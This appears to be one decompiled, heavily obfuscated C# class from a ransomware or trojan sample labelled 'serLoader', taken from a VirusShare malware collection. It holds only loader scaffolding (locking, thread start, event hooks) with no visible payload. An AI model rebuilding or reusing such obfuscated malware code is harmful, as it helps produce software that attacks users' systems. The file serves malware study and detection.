// Decompiled with JetBrains decompiler
// Type: .
// Assembly: serLoader, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EB10F7D0-661D-4A45-B90F-D464336E900E
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\HEUR-Trojan.Win32.Generic-6e30d9d30dc061aaa5d5a9b0ef5a7d10a511c47eeca2f7d551c865b912705901.exe

using \u0004;
using \u0005;
using \u0006;
using \u000E;
using System;
using System.Runtime.InteropServices;
using System.Threading;

namespace \u0006
{
  internal abstract class \u0001
  {
    private static bool \u0001;
    private \u0007 \u0001;
    private static readonly object \u0001;

    protected void \u0002([In] uint obj0)
    {
      object obj1;
      try
      {
        try
        {
          object obj2 = \u0001.\u0001;
          if (true)
            obj1 = obj2;
          Monitor.Enter(obj2);
          try
          {
            this.\u0002();
            int num;
            do
            {
              num = (int) obj0;
              while (true)
              {
                if (true)
                {
                  \u0007.\u0002((uint) num);
                  num = 0;
                  break;
                }
              }
            }
            while (num != 0);
          }
          finally
          {
            \u0013\u0003.\u001A\u0004(obj1);
          }
        }
        catch
        {
        }
      }
      catch (Exception ex)
      {
        object obj3 = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<uint> local = (ValueType) obj0;
        \u0002.\u0002(ex, obj3, (object) this, (object) local);
        throw;
      }
    }

    protected void \u0002([In] string obj0)
    {
      object obj1;
      try
      {
        try
        {
          object obj2 = \u0001.\u0001;
          if (true)
            obj1 = obj2;
          Monitor.Enter(obj2);
          try
          {
            this.\u0002();
            do
            {
              \u0007.\u0003(obj0);
            }
            while (false);
          }
          finally
          {
            \u0013\u0003.\u001A\u0004(obj1);
          }
        }
        catch
        {
        }
      }
      catch (Exception ex)
      {
        object obj3 = obj1;
        string str = obj0;
        \u0002.\u0002(ex, obj3, (object) this, (object) str);
        throw;
      }
    }

    private void \u0002()
    {
      \u0001.\u0003 obj1;
      Thread thread1;
      try
      {
        if (true)
        {
          if (\u0001.\u0001)
            return;
          \u0001.\u0003 obj2 = new \u0001.\u0003();
          if (true)
            obj1 = obj2;
          obj1.\u0001 = this;
          obj1.\u0001 = \u0007.\u0002();
        }
        if (true)
        {
          Thread thread2 = new Thread(new ThreadStart(obj1.\u0002));
          if (true)
            goto label_8;
label_4:
          \u008E\u0004.\u007E\u0082\u0004((object) thread1, ApartmentState.STA);
          \u0013\u0003.\u007E\u001E\u0004((object) thread1);
          goto label_5;
label_8:
          thread1 = thread2;
          goto label_4;
        }
label_5:
        \u0006\u0004.\u007E\u0097\u0002((object) \u0004\u0004.\u0095\u0002(), new EventHandler(this.\u0002));
        \u0001.\u0001 = true;
      }
      catch (Exception ex)
      {
        Thread thread3 = thread1;
        \u0001.\u0003 obj3 = obj1;
        \u0002.\u0002(ex, (object) thread3, (object) obj3, (object) this);
        throw;
      }
    }

    private void \u0002([In] object obj0, [In] EventArgs obj1)
    {
      \u0005.\u0006 obj2;
      \u0002 obj3;
      try
      {
        if (false)
          goto label_4;
        else
          goto label_10;
label_1:
        \u0002 obj4 = new \u0002(obj2);
        if (true)
          obj3 = obj4;
label_2:
        obj3.\u0002(new \u0007(this.\u0002));
        if (this.\u0002())
          this.\u0002(obj3);
        else
          goto label_5;
label_4:
        \u0007.\u0002();
label_5:
        if (true)
        {
          if (true)
            return;
          goto label_2;
        }
        else
          goto label_1;
label_10:
        \u0005.\u0006 obj5 = \u0007.\u0003();
        if (true)
          obj2 = obj5;
        if (obj2.\u0002())
          goto label_5;
        else
          goto label_1;
      }
      catch (Exception ex)
      {
        \u0005.\u0006 obj6 = obj2;
        \u0002 obj7 = obj3;
        object obj8 = obj0;
        EventArgs eventArgs = obj1;
        \u0002.\u0002(ex, (object) obj6, (object) obj7, (object) this, obj8, (object) eventArgs);
        throw;
      }
    }

    protected abstract void \u0002([In] \u0002 obj0);

    protected abstract bool \u0002();

    private void \u0002([In] \u0005.\u0006 obj0)
    {
label_0:
      \u0002 obj1;
      try
      {
        \u0002 obj2 = new \u0002(obj0);
        if (true)
          obj1 = obj2;
        obj1.\u0002(new \u0007(this.\u0002));
        if (false)
          goto label_5;
label_1:
        if (true)
        {
          if (this.\u0002())
            this.\u0002(obj1);
          \u0005.\u0005.\u0002();
        }
        else
          goto label_0;
label_5:
        if (false)
          goto label_1;
      }
      catch (Exception ex)
      {
        \u0002 obj3 = obj1;
        \u0005.\u0006 obj4 = obj0;
        \u0002.\u0002(ex, (object) obj3, (object) this, (object) obj4);
        throw;
      }
    }

    private void \u0002([In] object obj0, [In] \u0008 obj1)
    {
      \u0007 obj2;
      try
      {
        \u0007 obj3 = this.\u0001;
        if (true)
          obj2 = obj3;
        if (obj2 == null)
          return;
        obj2(obj0, obj1);
      }
      catch (Exception ex)
      {
        \u0007 obj4 = obj2;
        object obj5 = obj0;
        \u0008 obj6 = obj1;
        \u0002.\u0002(ex, (object) obj4, (object) this, obj5, (object) obj6);
        throw;
      }
    }

    protected \u0001()
    {
      try
      {
      }
      catch (Exception ex)
      {
        \u0002.\u0002(ex, (object) this);
        throw;
      }
    }

    static \u0001()
    {
      try
      {
        \u0001.\u0001 = new object();
      }
      catch (Exception ex)
      {
        \u0002.\u0002(ex);
        throw;
      }
    }

    private sealed class \u0003
    {
      public \u0005.\u0006 \u0001;
      public \u0001 \u0001;

      public \u0003()
      {
        try
        {
        }
        catch (Exception ex)
        {
          \u0002.\u0002(ex, (object) this);
          throw;
        }
      }

      public void \u0002()
      {
        try
        {
          this.\u0001.\u0002(this.\u0001);
        }
        catch (Exception ex)
        {
          \u0002.\u0002(ex, (object) this);
          throw;
        }
      }
    }
  }
}
